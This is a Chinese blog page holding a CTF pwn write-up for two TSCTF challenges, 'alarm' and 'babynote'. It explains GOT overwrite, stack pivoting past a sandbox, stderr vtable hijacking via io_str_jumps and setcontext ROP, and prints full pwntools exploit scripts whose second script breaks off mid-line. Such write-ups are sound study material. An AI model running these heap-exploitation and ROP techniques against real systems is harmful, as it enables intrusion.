<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="我的博客">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="我的博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/27/TSCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/27/TSCTF/" class="post-title-link" itemprop="url">TSCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-04-27 21:13:33 / 修改时间：21:14:13" itemprop="dateCreated datePublished" datetime="2022-04-27T21:13:33+08:00">2022-04-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="TSCTF-pwn"><a href="#TSCTF-pwn" class="headerlink" title="TSCTF pwn"></a>TSCTF pwn</h1><p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220425124307333.png" alt="image-20220425124307333"></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220425124334437.png" alt="image-20220425124334437"></p>
<h2 id="0x1-alarm"><a href="#0x1-alarm" class="headerlink" title="0x1 alarm"></a>0x1 alarm</h2><p>主要漏洞出现在堆的申请上，可以申请17个堆，然后覆盖edit函数的偏移值，把这个偏移值改成负数就可以向上覆盖got表了，我没做出来的主要原因是我以为这个偏移值是字符的输入个数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_2AF7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// ax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_5520;</span><br><span class="line">  <span class="keyword">if</span> ( (__int16)dword_5520 &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = dword_5520++;</span><br><span class="line">    v2 = <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[](&amp;unk_53E0, v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在ayoung佬这里学到一个很好用的gadget来绕过沙箱进行rop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub    rsp, 0x18</span><br><span class="line">mov    rbp, qword ptr [rdi + 0x48]</span><br><span class="line">mov    rax, qword ptr [rbp + 0x18]</span><br><span class="line">lea    r13, [rbp + 0x10]</span><br><span class="line">mov    dword ptr [rbp + 0x10], 0</span><br><span class="line">mov    rdi, r13</span><br><span class="line">call   qword ptr [rax + 0x28]</span><br></pre></td></tr></table></figure>

<p>这个gadget的主要作用就是通过rdi控制rbp然后再跳一个leave_ret就可以控制rsp来完成rop了</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;username: &quot;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;password: &quot;</span>)</span><br><span class="line">    sh.sendline(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx,choice</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Sure delete ?&quot;</span>)</span><br><span class="line">    sh.send(choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bye</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;byebye, good night~\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">duan=<span class="string">&quot;b *(0x7ffff7fc5000+&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="number">0x2B7D</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    init(<span class="string">&quot;rootroot&quot;</span>,<span class="string">&quot;#$%^&amp;*!@&quot;</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xfcf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="string">&#x27;\xc9&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    bye(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    libc_addr=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ed000</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">    free(<span class="number">1</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    bye(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x13b00</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">    add(<span class="number">0xfc60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    heap_17_addr=<span class="number">0x24fc0</span>+heap_addr</span><br><span class="line">    <span class="comment">#0x000000000008e1c4: mov esp, eax; mov rax, r12; pop r12; ret;</span></span><br><span class="line">    gadget=libc_addr+<span class="number">0x154d06</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        content=gadget&amp;<span class="number">0xff</span></span><br><span class="line">        gadget=gadget&gt;&gt;<span class="number">8</span></span><br><span class="line">        edit(p8(content))</span><br><span class="line">    heap_rop_addr=<span class="number">0x142d0</span>+heap_addr</span><br><span class="line">    pop_rdi=<span class="number">0x0000000000023b72</span>+libc_addr</span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12=<span class="number">0x0000000000119241</span>+libc_addr</span><br><span class="line">    syscall_ret=<span class="number">0x00000000000630d9</span>+libc_addr</span><br><span class="line">    pop_rax=<span class="number">0x0000000000047400</span>+libc_addr</span><br><span class="line">    leave_ret=libc_addr+<span class="number">0x00000000000578f8</span></span><br><span class="line"></span><br><span class="line">    rop=p64(heap_rop_addr)+p64(pop_rdx_r12)</span><br><span class="line">    rop+=p64(<span class="number">0</span>)+p64(heap_rop_addr)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(leave_ret)</span><br><span class="line">    rop+=p64(pop_rax)+p64(<span class="number">2</span>)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr+<span class="number">0xe8</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(heap_rop_addr+<span class="number">0x200</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)</span><br><span class="line">    rop+=p64(<span class="number">0x30</span>)+p64(libc_addr+libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr+<span class="number">0x200</span>)</span><br><span class="line">    rop+=p64(libc_addr+libc.sym[<span class="string">&quot;puts&quot;</span>])+<span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">    bye(rop)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x2-babynote"><a href="#0x2-babynote" class="headerlink" title="0x2 babynote"></a>0x2 babynote</h2><p>主要问题出现在了拷贝函数memcpy上，利用加密函数和read函数配合来完成堆的溢出拷贝，然后使用了然后把stderr的vtable覆盖成<code>io_str_jumps</code>,修改stderr结构体的内容，让stderr+0x28填上自己想填的地址，然后其他全填0，这样的话，最后exit就会执行stderr的io_str_overflow,这个函数会<code>call malloc</code>这时候程序的rdx指针是我们可以控制的了，具体和stderr+0x28相关，然后把malloc_hook覆盖成setcontext就可以控制rsp完成rop了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;10.7.2.133&quot;</span>,<span class="number">34789</span>)</span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrype_note</span>(<span class="params">idx,key</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;encrypt key: &quot;</span>,key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_note</span>(<span class="params">i,idx,key=<span class="number">0</span></span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;encrypt key: &quot;</span>,key)</span><br><span class="line">    </span><br><span class="line">duan=<span class="string">&quot;b *(0x7ffff7fc5000+&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="number">0x1747</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    rand=<span class="number">0xa6381cc</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf8</span>-<span class="number">8</span>-<span class="number">3</span>)+p64(<span class="number">0x481</span>)</span><br><span class="line">    write_note(<span class="number">0xf8</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    key=<span class="string">&#x27;:&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    encrype_note(<span class="number">0</span>,key)</span><br><span class="line">    key=p32(rand)+<span class="string">&#x27;:&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    read_note(<span class="number">1</span>,<span class="number">0</span>,key)</span><br><span class="line">    delete_note(<span class="number">1</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;\a\n&#x27;</span>)</span><br><span class="line">    read_note(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    ret=<span class="number">0x0000000000022679</span>+libc_base</span><br><span class="line">    pop_rdi=<span class="number">0x0000000000023b72</span>+libc_base</span><br><span class="line">    pop_rsi=<span class="number">0x000000000002604f</span>+libc_base</span><br><span class="line">    pop_rdx_r12=<span class="number">0x0000000000119241</span>+libc_base</span><br><span class="line">    syscall_ret=<span class="number">0x00000000000630d9</span>+libc_base</span><br><span class="line">    pop_rax=<span class="number">0x0000000000047400</span>+libc_base</span><br><span class="line">    add_rsp_0x20_pop_rdx=<span class="number">0x0000000000042b71</span>+libc_base</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;\a\n&#x27;</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    read_note(<span class="number">0</span>,<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x18a0</span></span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    stderr=libc_base+<span class="number">0x1ed5c0</span></span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(stderr-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    setcontext_addr=libc_base+libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(stderr+<span class="number">0x10</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x70</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,pay)</span><br><span class="line">    </span><br><span class="line">    io_str_jumps_addr=libc_base+<span class="number">0x1e9560</span></span><br><span class="line"></span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">10</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(stderr+<span class="number">0xb0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    pay=p64(heap_base+<span class="number">0x1620</span>)+p64(ret)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(io_str_jumps_addr)</span><br><span class="line">    write_note(<span class="number">0x70</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">10</span>)</span><br><span class="line">    delete_note(<span 